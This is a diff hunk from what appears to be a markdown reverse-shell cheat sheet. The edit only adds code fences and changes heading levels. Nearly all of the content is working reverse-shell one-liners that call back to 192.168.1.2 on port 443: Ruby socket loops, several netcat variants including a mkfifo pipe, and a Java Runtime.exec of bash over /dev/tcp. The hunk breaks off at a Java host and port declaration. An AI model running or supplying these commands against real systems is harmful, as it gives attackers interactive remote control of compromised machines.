@@ -46,28 +46,36 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.2","443");while(cmd=c.
 ```
 
 ## or
+```
 ruby -rsocket -e 'c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+```
 
-## Netcat
+# Netcat
+```
 nc -e /bin/sh 192.168.1.2 443
+```
 
-## or
-
+# or
+```
 nc -e /bin/bash 192.168.1.2 443
+```
 
-## or
-
+# or
+```
 nc -c bash 192.168.1.2 443
-## or
-
+```
+# or
+```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
+```
 
-## Java
+# Java
+```
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
-
-## or
+```
+# or
 
 String host="192.168.1.2";
 int port=443;
